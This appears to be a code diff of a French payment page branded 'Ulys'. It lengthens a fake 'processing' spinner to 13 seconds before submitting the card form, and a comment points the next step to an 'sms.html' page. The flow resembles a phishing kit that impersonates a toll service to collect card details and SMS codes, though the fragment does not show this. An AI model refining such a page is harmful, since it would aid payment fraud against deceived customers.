@@ -61,17 +61,16 @@
   <footer>
     &copy; 2025 Ulys. Paiement 100 % sécurisé.
   </footer>
-
   <script>
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      // Affiche le spinner
-      document.getElementById("spinnerOverlay").style.display = "flex";
-      // Simulation de traitement avant redirection
-      setTimeout(() => {
-        this.submit(); // ou window.location.href = "sms.html";
-      }, 2000);
-    });
-  </script>
+  document.getElementById("paymentForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    // Affiche le spinner
+    document.getElementById("spinnerOverlay").style.display = "flex";
+    // Attendre 13 secondes avant de procéder
+    setTimeout(() => {
+      this.submit(); // ou window.location.href = "sms.html";
+    }, 13000);
+  });
+</script>
 </body>
 </html>
